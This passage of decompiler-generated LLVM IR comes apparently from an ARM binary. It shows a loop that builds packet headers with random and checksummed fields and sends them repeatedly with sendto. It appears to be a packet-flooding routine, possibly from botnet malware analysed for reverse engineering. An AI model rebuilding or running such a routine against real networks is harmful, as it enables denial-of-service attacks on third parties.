  %v3_c1a4 = add i32 %v2_c1a4, 3
  %v4_c1a4 = inttoptr i32 %v3_c1a4 to i8*
  store i8 %v1_c1a4, i8* %v4_c1a4, align 1
  %v0_c1a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_c1a8 = trunc i32 %v0_c1a8 to i8
  %v2_c1a8 = load i32, i32* %r6.global-to-local, align 4
  %v3_c1a8 = add i32 %v2_c1a8, 4
  %v4_c1a8 = inttoptr i32 %v3_c1a8 to i8*
  store i8 %v1_c1a8, i8* %v4_c1a8, align 1
  %v0_c1ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c1ac, i32* %stack_var_-40, align 4
  %v5_c1b0 = icmp slt i32 %v1_c18c, %v1_c198
  br i1 %v5_c1b0, label %dec_label_pc_c024, label %dec_label_pc_c1b4

dec_label_pc_c1b4:                                ; preds = %bb97
  %v1_c1bc = add i32 %v5_be50, 8
  store i32 %v1_c1bc, i32* %r3.global-to-local, align 4
  %v1_c1c0 = add i32 %v5_be50, 52
  store i32 %v1_c1c0, i32* %r1.global-to-local, align 4
  %v0_c1cc.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_c1cc.preheader

dec_label_pc_c1cc.preheader:                      ; preds = %dec_label_pc_c1b4, %dec_label_pc_c460
  %v0_c1cc.pre = phi i32 [ %v0_c1cc.pre.pre, %dec_label_pc_c1b4 ], [ %v0_bf14, %dec_label_pc_c460 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_c1c0, %dec_label_pc_c1b4 ], [ %v1_c46c, %dec_label_pc_c460 ]
  %stack_var_-152.0.ph = phi i32 [ %v1_c1bc, %dec_label_pc_c1b4 ], [ %v1_c468, %dec_label_pc_c460 ]
  %v2_c444 = icmp eq i32 %v1_be70, 0
  %v2_c244 = icmp eq i32 %v1_bf04, 0
  %v2_c210 = icmp eq i32 %v5_bea4, -1
  %v7_c210 = icmp eq i32 %v5_bea4, -1
  br label %dec_label_pc_c1cc

dec_label_pc_c1cc:                                ; preds = %dec_label_pc_c260, %dec_label_pc_c1cc.preheader
  %v0_c1cc = phi i32 [ %v0_c1cc.pre, %dec_label_pc_c1cc.preheader ], [ %v1_c324, %dec_label_pc_c260 ]
  %v2_c1cc = icmp eq i32 %v0_c1cc, 0
  store i1 %v2_c1cc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp98 = icmp slt i32 %v0_c1cc, 1
  br label %dec_label_pc_c1d4

dec_label_pc_c1d4:                                ; preds = %dec_label_pc_c1d4, %dec_label_pc_c1cc
  br i1 %tmp98, label %dec_label_pc_c1d4, label %dec_label_pc_c1d8

dec_label_pc_c1d8:                                ; preds = %dec_label_pc_c1d4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_c1e4

dec_label_pc_c1e4:                                ; preds = %dec_label_pc_c260, %dec_label_pc_c1d8
  %v1_c1f8 = phi i32 [ %v1_c320, %dec_label_pc_c260 ], [ 0, %dec_label_pc_c1d8 ]
  %v5_c1e8 = mul i32 %v1_c1f8, 24
  %v1_c1ec = load i32, i32* @sb, align 4
  %v2_c1ec = add i32 %v1_c1ec, %v5_c1e8
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v2_bd84, i32* %r1.global-to-local, align 4
  %v1_c1f4 = add i32 %v2_c1ec, 20
  %v2_c1f4 = inttoptr i32 %v1_c1f4 to i8*
  %v3_c1f4 = load i8, i8* %v2_c1f4, align 1
  %v4_c1f4 = zext i8 %v3_c1f4 to i32
  store i32 %v4_c1f4, i32* %r2.global-to-local, align 4
  %v4_c1f8 = mul i32 %v1_c1f8, 4
  %v5_c1f8 = add i32 %v4_c1f8, %v2_bd84
  %v6_c1f8 = inttoptr i32 %v5_c1f8 to i32*
  %v7_c1f8 = load i32, i32* %v6_c1f8, align 4
  store i32 %v7_c1f8, i32* @r5, align 4
  %v7_c1fc = icmp eq i8 %v3_c1f4, 31
  store i1 %v7_c1fc, i1* %cpsr_z.global-to-local, align 1
  %v1_c200 = add i32 %v7_c1f8, 24
  store i32 %v1_c200, i32* @r6, align 4
  %v1_c204 = add i32 %v7_c1f8, 44
  store i32 %v1_c204, i32* @r7, align 4
  %tmp106 = icmp ult i8 %v3_c1f4, 32
  br i1 %tmp106, label %dec_label_pc_c344, label %dec_label_pc_c20c

dec_label_pc_c20c:                                ; preds = %dec_label_pc_c1e4
  store i32 %v5_bea4, i32* %r2.global-to-local, align 4
  store i1 %v7_c210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c210, label %dec_label_pc_c3ac, label %dec_label_pc_c218

dec_label_pc_c218:                                ; preds = %dec_label_pc_c344, %dec_label_pc_c20c
  store i32 65535, i32* @r4, align 4
  %v0_c220 = load i32, i32* @sl, align 4
  %v9_c220 = icmp eq i32 %v0_c220, 65535
  store i1 %v9_c220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c220, label %dec_label_pc_c3c4, label %dec_label_pc_c228

dec_label_pc_c228:                                ; preds = %dec_label_pc_c3ac.dec_label_pc_c228_crit_edge, %dec_label_pc_c218
  %v1_c22c = phi i32 [ %v1_c22c.pre, %dec_label_pc_c3ac.dec_label_pc_c228_crit_edge ], [ 65535, %dec_label_pc_c218 ]
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %v9_c22c = icmp eq i32 %v3_bf0c, %v1_c22c
  store i1 %v9_c22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c22c, label %dec_label_pc_c3fc, label %dec_label_pc_c234

dec_label_pc_c234:                                ; preds = %dec_label_pc_c3c4.dec_label_pc_c234_crit_edge, %dec_label_pc_c228
  %v1_c238 = phi i32 [ %v1_c238.pre, %dec_label_pc_c3c4.dec_label_pc_c234_crit_edge ], [ %v1_c22c, %dec_label_pc_c228 ]
  store i32 %v3_bf10, i32* %r1.global-to-local, align 4
  %v9_c238 = icmp eq i32 %v3_bf10, %v1_c238
  store i1 %v9_c238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c238, label %dec_label_pc_c418, label %dec_label_pc_c240

dec_label_pc_c240:                                ; preds = %dec_label_pc_c3fc, %dec_label_pc_c234
  store i32 %v1_bf04, i32* %r2.global-to-local, align 4
  store i1 %v2_c244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c244, label %dec_label_pc_c43c, label %.thread27

.thread27:                                        ; preds = %dec_label_pc_c240
  %v1_c248 = load i32, i32* @r5, align 4
  %v2_c248 = add i32 %v1_c248, 16
  %v3_c248 = inttoptr i32 %v2_c248 to i32*
  %v4_c248 = load i32, i32* %v3_c248, align 4
  store i32 %v4_c248, i32* %r3.global-to-local, align 4
  %v2_c24c = load i32, i32* @r6, align 4
  %v3_c24c = add i32 %v2_c24c, 16
  %v4_c24c = inttoptr i32 %v3_c24c to i32*
  store i32 %v4_c248, i32* %v4_c24c, align 4
  br label %dec_label_pc_c254

dec_label_pc_c254:                                ; preds = %bb103, %.thread27
  store i32 %v1_be70, i32* %r3.global-to-local, align 4
  store i1 %v2_c444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c444, label %dec_label_pc_c260, label %dec_label_pc_c450

dec_label_pc_c260:                                ; preds = %dec_label_pc_c254, %dec_label_pc_c43c, %dec_label_pc_c450
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c264 = load i32, i32* @r8, align 4
  %v1_c264 = trunc i32 %v0_c264 to i8
  %v2_c264 = load i32, i32* @r5, align 4
  %v3_c264 = add i32 %v2_c264, 10
  %v4_c264 = inttoptr i32 %v3_c264 to i8*
  store i8 %v1_c264, i8* %v4_c264, align 1
  %v0_c268 = load i32, i32* @r8, align 4
  %v1_c268 = trunc i32 %v0_c268 to i8
  %v2_c268 = load i32, i32* @r5, align 4
  %v3_c268 = add i32 %v2_c268, 11
  %v4_c268 = inttoptr i32 %v3_c268 to i8*
  store i8 %v1_c268, i8* %v4_c268, align 1
  %v0_c26c = load i32, i32* @r5, align 4
  store i32 %v0_c26c, i32* @r0, align 4
  %v2_c270 = call i32 @function_f19c(i32 %v0_c26c, i32 20)
  %v3_c270 = trunc i32 %v2_c270 to i8
  %v4_c274 = sdiv i32 %v2_c270, 256
  store i32 %v4_c274, i32* %r3.global-to-local, align 4
  %v1_c278 = trunc i32 %v4_c274 to i8
  %v2_c278 = load i32, i32* @r5, align 4
  %v3_c278 = add i32 %v2_c278, 11
  %v4_c278 = inttoptr i32 %v3_c278 to i8*
  store i8 %v1_c278, i8* %v4_c278, align 1
  %v3_c27c = load i32, i32* @r5, align 4
  %v4_c27c = add i32 %v3_c27c, 10
  %v5_c27c = inttoptr i32 %v4_c27c to i8*
  store i8 %v3_c270, i8* %v5_c27c, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c284 = load i32, i32* @r8, align 4
  %v1_c284 = trunc i32 %v0_c284 to i8
  %v2_c284 = load i32, i32* @r6, align 4
  %v3_c284 = add i32 %v2_c284, 10
  %v4_c284 = inttoptr i32 %v3_c284 to i8*
  store i8 %v1_c284, i8* %v4_c284, align 1
  %v0_c288 = load i32, i32* @r8, align 4
  %v1_c288 = trunc i32 %v0_c288 to i8
  %v2_c288 = load i32, i32* @r6, align 4
  %v3_c288 = add i32 %v2_c288, 11
  %v4_c288 = inttoptr i32 %v3_c288 to i8*
  store i8 %v1_c288, i8* %v4_c288, align 1
  %v0_c28c = load i32, i32* @r6, align 4
  store i32 %v0_c28c, i32* @r0, align 4
  %v2_c290 = call i32 @function_f19c(i32 %v0_c28c, i32 20)
  %v3_c290 = trunc i32 %v2_c290 to i8
  store i32 %v2_c290, i32* %r0.global-to-local, align 4
  %v4_c294 = sdiv i32 %v2_c290, 256
  store i32 %v4_c294, i32* %r3.global-to-local, align 4
  %v3_c298 = load i32, i32* @r6, align 4
  %v4_c298 = add i32 %v3_c298, 10
  %v5_c298 = inttoptr i32 %v4_c298 to i8*
  store i8 %v3_c290, i8* %v5_c298, align 1
  %v0_c29c = load i32, i32* %r3.global-to-local, align 4
  %v1_c29c = trunc i32 %v0_c29c to i8
  %v2_c29c = load i32, i32* @r6, align 4
  %v3_c29c = add i32 %v2_c29c, 11
  %v4_c29c = inttoptr i32 %v3_c29c to i8*
  store i8 %v1_c29c, i8* %v4_c29c, align 1
  %v0_c2a0 = load i32, i32* @r7, align 4
  %v1_c2a0 = add i32 %v0_c2a0, 4
  %v2_c2a0 = inttoptr i32 %v1_c2a0 to i8*
  %v3_c2a0 = load i8, i8* %v2_c2a0, align 1
  %v4_c2a0 = zext i8 %v3_c2a0 to i32
  store i32 %v4_c2a0, i32* %r3.global-to-local, align 4
  %v1_c2a4 = add i32 %v0_c2a0, 5
  %v2_c2a4 = inttoptr i32 %v1_c2a4 to i8*
  %v3_c2a4 = load i8, i8* %v2_c2a4, align 1
  %v4_c2a4 = zext i8 %v3_c2a4 to i32
  store i32 %v0_c2a0, i32* @r1, align 4
  %v4_c2ac = mul nuw nsw i32 %v4_c2a4, 256
  %v5_c2ac = or i32 %v4_c2ac, %v4_c2a0
  store i32 %v5_c2ac, i32* %r2.global-to-local, align 4
  %v0_c2b0 = load i32, i32* @r8, align 4
  %v1_c2b0 = trunc i32 %v0_c2b0 to i8
  %v3_c2b0 = add i32 %v0_c2a0, 6
  %v4_c2b0 = inttoptr i32 %v3_c2b0 to i8*
  store i8 %v1_c2b0, i8* %v4_c2b0, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_c2b8 = load i32, i32* @r8, align 4
  %v1_c2b8 = trunc i32 %v0_c2b8 to i8
  %v2_c2b8 = load i32, i32* @r7, align 4
  %v3_c2b8 = add i32 %v2_c2b8, 7
  %v4_c2b8 = inttoptr i32 %v3_c2b8 to i8*
  store i8 %v1_c2b8, i8* %v4_c2b8, align 1
  %v0_c2bc = load i32, i32* @r6, align 4
  store i32 %v0_c2bc, i32* %r0.global-to-local, align 4
  %v4_c2c0 = call i32 @function_f1f8(i32 %v0_c2bc, i32 %v0_c2a0, i32 %v5_c2ac, i32 %stack_var_-152.0.ph)
  %v5_c2c0 = trunc i32 %v4_c2c0 to i8
  store i32 %v4_c2c0, i32* %r0.global-to-local, align 4
  %v3_c2c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c2c4, i32* %r3.global-to-local, align 4
  %v3_c2c8 = mul i32 %v3_c2c4, 32
  store i32 %v3_c2c8, i32* %r2.global-to-local, align 4
  %v0_c2cc = load i32, i32* @r5, align 4
  %v1_c2cc = add i32 %v0_c2cc, 16
  %v2_c2cc = inttoptr i32 %v1_c2cc to i32*
  %v3_c2cc = load i32, i32* %v2_c2cc, align 4
  store i32 %v3_c2cc, i32* %r1.global-to-local, align 4
  %v5_c2d0 = mul i32 %v3_c2c4, 24
  store i32 %v5_c2d0, i32* %r2.global-to-local, align 4
  %v4_c2d443 = udiv i32 %v4_c2c0, 256
  %v1_c2d8 = trunc i32 %v4_c2d443 to i8
  %v2_c2d8 = load i32, i32* @r7, align 4
  %v3_c2d8 = add i32 %v2_c2d8, 7
  %v4_c2d8 = inttoptr i32 %v3_c2d8 to i8*
  store i8 %v1_c2d8, i8* %v4_c2d8, align 1
  %v0_c2dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c2dc = load i32, i32* @sb, align 4
  %v2_c2dc = add i32 %v1_c2dc, %v0_c2dc
  store i32 %v2_c2dc, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_c2e4 = load i32, i32* @r7, align 4
  %v4_c2e4 = add i32 %v3_c2e4, 6
  %v5_c2e4 = inttoptr i32 %v4_c2e4 to i8*
  store i8 %v5_c2c0, i8* %v5_c2e4, align 1
  %v0_c2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c2e8 = load i32, i32* %lr.global-to-local, align 4
  %v2_c2e8 = add i32 %v1_c2e8, 4
  %v3_c2e8 = inttoptr i32 %v2_c2e8 to i32*
  store i32 %v0_c2e8, i32* %v3_c2e8, align 4
  %v0_c2ec = load i32, i32* %r3.global-to-local, align 4
  %v1_c2ec = trunc i32 %v0_c2ec to i8
  %v2_c2ec = load i32, i32* %r2.global-to-local, align 4
  %v3_c2ec = load i32, i32* @sb, align 4
  %v4_c2ec = add i32 %v3_c2ec, %v2_c2ec
  %v5_c2ec = inttoptr i32 %v4_c2ec to i8*
  store i8 %v1_c2ec, i8* %v5_c2ec, align 1
  %v0_c2f0 = load i32, i32* @r8, align 4
  %v1_c2f0 = trunc i32 %v0_c2f0 to i8
  %v2_c2f0 = load i32, i32* %lr.global-to-local, align 4
  %v3_c2f0 = add i32 %v2_c2f0, 2
  %v4_c2f0 = inttoptr i32 %v3_c2f0 to i8*
  store i8 %v1_c2f0, i8* %v4_c2f0, align 1
  %v0_c2f4 = load i32, i32* @r8, align 4
  %v1_c2f4 = trunc i32 %v0_c2f4 to i8
  %v2_c2f4 = load i32, i32* %lr.global-to-local, align 4
  %v3_c2f4 = add i32 %v2_c2f4, 1
  %v4_c2f4 = inttoptr i32 %v3_c2f4 to i8*
  store i8 %v1_c2f4, i8* %v4_c2f4, align 1
  %v0_c2f8 = load i32, i32* @r8, align 4
  %v1_c2f8 = trunc i32 %v0_c2f8 to i8
  %v2_c2f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_c2f8 = add i32 %v2_c2f8, 3
  %v4_c2f8 = inttoptr i32 %v3_c2f8 to i8*
  store i8 %v1_c2f8, i8* %v4_c2f8, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c304 = load i32, i32* @r5, align 4
  store i32 %v0_c304, i32* %r1.global-to-local, align 4
  store i32 %v3_beb8, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_c310 = load i32, i32* %lr.global-to-local, align 4
  %v4_c310 = inttoptr i32 %v0_c310 to %sockaddr*
  %v7_c318 = inttoptr i32 %v0_c304 to i32*
  %v9_c318 = call i32 @sendto(i32 %v3_beb8, i32* %v7_c318, i32 %stack_var_-120.0.ph, i32 16384, %sockaddr* %v4_c310, i32 16)
  %v3_c31c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c31c, i32* %r3.global-to-local, align 4
  %v1_c320 = add i32 %v3_c31c, 1
  store i32 %v1_c320, i32* %r0.global-to-local, align 4
  %v1_c324 = load i32, i32* @fp, align 4
  %v9_c324 = icmp eq i32 %v1_c320, %v1_c324
  store i1 %v9_c324, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c320, i32* %stack_var_-40, align 4
  %v6_c32c = icmp slt i32 %v1_c320, %v1_c324
  br i1 %v6_c32c, label %dec_label_pc_c1e4, label %dec_label_pc_c1cc

dec_label_pc_c334:                                ; preds = %dec_label_pc_bec8
  store i32 %v3_beb8, i32* %r0.global-to-local, align 4
  %v1_c338 = call i32 @close(i32 %v3_beb8)
  store i32 %v1_c338, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_bd64, %dec_label_pc_c334
  %v29_c340 = phi i32 [ %v3_beb8, %dec_label_pc_bd64 ], [ %v1_c338, %dec_label_pc_c334 ]
  store i32 %v3_bd64, i32* %r4.global-to-local, align 4
  store i32 %v6_bd64, i32* %r5.global-to-local, align 4
  store i32 %v9_bd64, i32* %r6.global-to-local, align 4
  store i32 %v12_bd64, i32* %r7.global-to-local, align 4
  store i32 %v15_bd64, i32* %r8.global-to-local, align 4
  ret i32 %v29_c340

dec_label_pc_c344:                                ; preds = %dec_label_pc_c1e4
  %v1_c344 = add i32 %v2_c1ec, 16
  %v2_c344 = inttoptr i32 %v1_c344 to i32*
  %v3_c344 = load i32, i32* %v2_c344, align 4
  store i32 %v3_c344, i32* %r4.global-to-local, align 4
  %v0_c348 = call i32 @function_10bd8()
  store i32 %v0_c348, i32* %r0.global-to-local, align 4
  %v3_c34c = load i32, i32* %stack_var_-40, align 4
  %v5_c354 = mul i32 %v3_c34c, 24
  %v0_c358 = load i32, i32* %r4.global-to-local, align 4
  %v1_c35c = load i32, i32* @sb, align 4
  %v2_c35c = add i32 %v1_c35c, %v5_c354
  store i32 %v2_c35c, i32* %r1.global-to-local, align 4
  %v1_c360 = and i32 %v0_c358, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_c360, i32* %r3.global-to-local, align 4
  %v1_c358 = udiv i32 %v0_c358, 256
  %v3_c364 = and i32 %v1_c358, 65280
  store i32 %v3_c364, i32* %r2.global-to-local, align 4
  %v3_c368 = mul i32 %v0_c358, 16777216
  %v1_c36c = add i32 %v2_c35c, 20
  %v2_c36c = inttoptr i32 %v1_c36c to i8*
  %v3_c36c = load i8, i8* %v2_c36c, align 1
  %v4_c36c = zext i8 %v3_c36c to i32
  store i32 %v4_c36c, i32* %lr.global-to-local, align 4
  %v4_c370 = mul i32 %v1_c360, 256
  %v5_c370 = or i32 %v4_c370, %v3_c368
  %v4_c374 = udiv i32 %v0_c358, 16777216
  %v5_c374 = or i32 %v3_c364, %v4_c374
  %v2_c378 = or i32 %v5_c374, %v5_c370
  %v7_c37c = lshr i32 %v0_c348, %v4_c36c
  %v8_c37c = add i32 %v7_c37c, %v2_c378
  %v3_c388 = mul i32 %v8_c37c, 16777216
  %v1_c38c = and i32 %v8_c37c, 65280
  store i32 %v1_c38c, i32* %r0.global-to-local, align 4
  store i32 %v5_bea4, i32* %r2.global-to-local, align 4
  %v4_c398 = mul nuw nsw i32 %v1_c38c, 256
  %v5_c398 = or i32 %v4_c398, %v3_c388
  store i32 %v5_c398, i32* %r1.global-to-local, align 4
  %v2_c39c = call i32 @llvm.bswap.i32(i32 %v8_c37c)
  store i32 %v2_c39c, i32* %r3.global-to-local, align 4
  store i1 %v7_c210, i1* %cpsr_z.global-to-local, align 1
  %v1_c3a4 = load i32, i32* @r5, align 4
  %v2_c3a4 = add i32 %v1_c3a4, 16
  %v3_c3a4 = inttoptr i32 %v2_c3a4 to i32*
  store i32 %v2_c39c, i32* %v3_c3a4, align 4
  br i1 %v2_c210, label %dec_label_pc_c3ac, label %dec_label_pc_c218

dec_label_pc_c3ac:                                ; preds = %dec_label_pc_c344, %dec_label_pc_c20c
  %v0_c3ac = call i32 @function_10bd8()
  store i32 %v0_c3ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_c3b8 = load i32, i32* @sl, align 4
  %v9_c3b8 = icmp eq i32 %v0_c3b8, 65535
  store i1 %v9_c3b8, i1* %cpsr_z.global-to-local, align 1
  %v1_c3bc = load i32, i32* @r5, align 4
  %v2_c3bc = add i32 %v1_c3bc, 12
  %v3_c3bc = inttoptr i32 %v2_c3bc to i32*
  store i32 %v0_c3ac, i32* %v3_c3bc, align 4
  br i1 %v9_c3b8, label %dec_label_pc_c3c4, label %dec_label_pc_c3ac.dec_label_pc_c228_crit_edge

dec_label_pc_c3ac.dec_label_pc_c228_crit_edge:    ; preds = %dec_label_pc_c3ac
  %v1_c22c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c228

dec_label_pc_c3c4:                                ; preds = %dec_label_pc_c3ac, %dec_label_pc_c218
  %v0_c3c4 = call i32 @function_10bd8()
  %v3_c3cc = urem i32 %v0_c3c4, 65536
  store i32 %v3_c3cc, i32* %r0.global-to-local, align 4
  %v3_c3d016 = udiv i32 %v0_c3c4, 256
  %v1_c3d4 = trunc i32 %v3_c3d016 to i8
  %v2_c3d4 = load i32, i32* @r5, align 4
  %v3_c3d4 = add i32 %v2_c3d4, 5
  %v4_c3d4 = inttoptr i32 %v3_c3d4 to i8*
  store i8 %v1_c3d4, i8* %v4_c3d4, align 1
  %v0_c3d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %v1_c3e0 = sub i32 999, %v0_c3d8
  store i32 %v1_c3e0, i32* %r2.global-to-local, align 4
  %v3_c3e4 = sdiv i32 %v1_c3e0, 256
  store i32 %v3_c3e4, i32* %r1.global-to-local, align 4
  %v1_c3e8 = load i32, i32* @r4, align 4
  %v9_c3e8 = icmp eq i32 %v3_bf0c, %v1_c3e8
  store i1 %v9_c3e8, i1* %cpsr_z.global-to-local, align 1
  %v1_c3ec = trunc i32 %v0_c3d8 to i8
  %v2_c3ec = load i32, i32* @r5, align 4
  %v3_c3ec = add i32 %v2_c3ec, 4
  %v4_c3ec = inttoptr i32 %v3_c3ec to i8*
  store i8 %v1_c3ec, i8* %v4_c3ec, align 1
  %v0_c3f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c3f0 = trunc i32 %v0_c3f0 to i8
  %v2_c3f0 = load i32, i32* @r6, align 4
  %v3_c3f0 = add i32 %v2_c3f0, 5
  %v4_c3f0 = inttoptr i32 %v3_c3f0 to i8*
  store i8 %v1_c3f0, i8* %v4_c3f0, align 1
  %v0_c3f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c3f4 = trunc i32 %v0_c3f4 to i8
  %v2_c3f4 = load i32, i32* @r6, align 4
  %v3_c3f4 = add i32 %v2_c3f4, 4
  %v4_c3f4 = inttoptr i32 %v3_c3f4 to i8*
  store i8 %v1_c3f4, i8* %v4_c3f4, align 1
  %v0_c3f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c3f8, label %dec_label_pc_c3fc, label %dec_label_pc_c3c4.dec_label_pc_c234_crit_edge

dec_label_pc_c3c4.dec_label_pc_c234_crit_edge:    ; preds = %dec_label_pc_c3c4
  %v1_c238.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c234

dec_label_pc_c3fc:                                ; preds = %dec_label_pc_c3c4, %dec_label_pc_c228
  %v0_c3fc = call i32 @function_10bd8()
  %v1_c3fc = trunc i32 %v0_c3fc to i8
  store i32 %v0_c3fc, i32* %r0.global-to-local, align 4
  store i32 %v3_bf10, i32* %r1.global-to-local, align 4
  %v4_c404 = sdiv i32 %v0_c3fc, 256
  store i32 %v4_c404, i32* %r3.global-to-local, align 4
  %v1_c408 = load i32, i32* @r4, align 4
  %v9_c408 = icmp eq i32 %v3_bf10, %v1_c408
  store i1 %v9_c408, i1* %cpsr_z.global-to-local, align 1
  %v3_c40c = load i32, i32* @r5, align 4
  %v4_c40c = add i32 %v3_c40c, 44
  %v5_c40c = inttoptr i32 %v4_c40c to i8*
  store i8 %v1_c3fc, i8* %v5_c40c, align 1
  %v0_c410 = load i32, i32* %r3.global-to-local, align 4
  %v1_c410 = trunc i32 %v0_c410 to i8
  %v2_c410 = load i32, i32* @r7, align 4
  %v3_c410 = add i32 %v2_c410, 1
  %v4_c410 = inttoptr i32 %v3_c410 to i8*
  store i8 %v1_c410, i8* %v4_c410, align 1
  %v0_c414 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c414, label %dec_label_pc_c418, label %dec_label_pc_c240

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3fc, %dec_label_pc_c234
  %v0_c418 = call i32 @function_10bd8()
  %v1_c418 = trunc i32 %v0_c418 to i8
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  store i32 %v1_bf04, i32* %r2.global-to-local, align 4
  %v4_c420 = sdiv i32 %v0_c418, 256
  store i32 %v4_c420, i32* %r3.global-to-local, align 4
  store i1 %v2_c244, i1* %cpsr_z.global-to-local, align 1
  %v1_c428 = trunc i32 %v4_c420 to i8
  %v2_c428 = load i32, i32* @r7, align 4
  %v3_c428 = add i32 %v2_c428, 3
  %v4_c428 = inttoptr i32 %v3_c428 to i8*
  store i8 %v1_c428, i8* %v4_c428, align 1
  %v0_c42c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c42c, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_c418
  %v1_c42c = load i32, i32* @r5, align 4
  %v2_c42c = add i32 %v1_c42c, 16
  %v3_c42c = inttoptr i32 %v2_c42c to i32*
  %v4_c42c = load i32, i32* %v3_c42c, align 4
  store i32 %v4_c42c, i32* %r3.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_c418, %bb101
  %v3_c430 = load i32, i32* @r7, align 4
  %v4_c430 = add i32 %v3_c430, 2
  %v5_c430 = inttoptr i32 %v4_c430 to i8*
  store i8 %v1_c418, i8* %v5_c430, align 1
  %v0_c434 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c434, label %dec_label_pc_c43c, label %bb103

bb103:                                            ; preds = %bb102
  %v1_c434 = load i32, i32* %r3.global-to-local, align 4
  %v2_c434 = load i32, i32* @r6, align 4
  %v3_c434 = add i32 %v2_c434, 16
  %v4_c434 = inttoptr i32 %v3_c434 to i32*
  store i32 %v1_c434, i32* %v4_c434, align 4
  br label %dec_label_pc_c254

dec_label_pc_c43c:                                ; preds = %dec_label_pc_c240, %bb102
  %v0_c43c = call i32 @function_10bd8()
  store i32 %v0_c43c, i32* %r0.global-to-local, align 4
  store i32 %v1_be70, i32* %r3.global-to-local, align 4
  store i1 %v2_c444, i1* %cpsr_z.global-to-local, align 1
  %v1_c448 = load i32, i32* @r6, align 4
  %v2_c448 = add i32 %v1_c448, 16
  %v3_c448 = inttoptr i32 %v2_c448 to i32*
  store i32 %v0_c43c, i32* %v3_c448, align 4
  br i1 %v2_c444, label %dec_label_pc_c260, label %dec_label_pc_c450

dec_label_pc_c450:                                ; preds = %dec_label_pc_c254, %dec_label_pc_c43c
  %v0_c450 = load i32, i32* @r7, align 4
  %v1_c450 = add i32 %v0_c450, 8
  store i32 %v1_c450, i32* %r0.global-to-local, align 4
  store i32 %v5_be50, i32* @r1, align 4
  %v1_c458 = inttoptr i32 %v1_c450 to i8*
  %v2_c458 = call i32 @function_10db4(i8* %v1_c458)
  store i32 %v2_c458, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c260

dec_label_pc_c460:                                ; preds = %dec_label_pc_bef0
  %v1_c468 = add i32 %v5_be50, 8
  store i32 %v1_c468, i32* %r2.global-to-local, align 4
  %v1_c46c = add i32 %v5_be50, 52
  store i32 %v1_c46c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c1cc.preheader

; uselistorder directives
  uselistorder i32 %v1_c46c, { 1, 0 }
  uselistorder i32 %v1_c468, { 1, 0 }
  uselistorder i32 %v4_c420, { 1, 0 }
  uselistorder i32 %v0_c418, { 0, 2, 1 }
  uselistorder i32 %v0_c3fc, { 0, 2, 1 }
  uselistorder i32 %v2_c39c, { 1, 0 }
  uselistorder i32 %v8_c37c, { 1, 2, 0 }
  uselistorder i32 %v0_c358, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c324, { 1, 2, 0 }
  uselistorder i32 %v1_c320, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_c2c4, { 1, 0, 2 }
  uselistorder i32 %v4_c2c0, { 0, 2, 1 }
  uselistorder i32 %v0_c2a0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_c290, { 0, 2, 1 }
  uselistorder i32 %v4_c274, { 1, 0 }
  uselistorder i32 %v7_c1f8, { 1, 0, 2 }
  uselistorder i32 %v0_c1cc, { 1, 0 }
  uselistorder i1 %v7_c210, { 2, 1, 0 }
  uselistorder i1 %v2_c444, { 2, 3, 1, 0 }
  uselistorder i32 %v1_c18c, { 1, 0, 2 }
  uselistorder i32 %v0_c150, { 1, 0, 2 }
  uselistorder i32 %v3_c004, { 0, 2, 1 }
  uselistorder i32 %v3_bfc4, { 1, 0 }
  uselistorder i32 %tmp87, { 1, 0 }
  uselistorder i32 %v1_bf7c, { 1, 0 }
  uselistorder i32 %v1_bf58, { 1, 0 }
  uselistorder i32 %v1_bf54, { 0, 2, 1 }
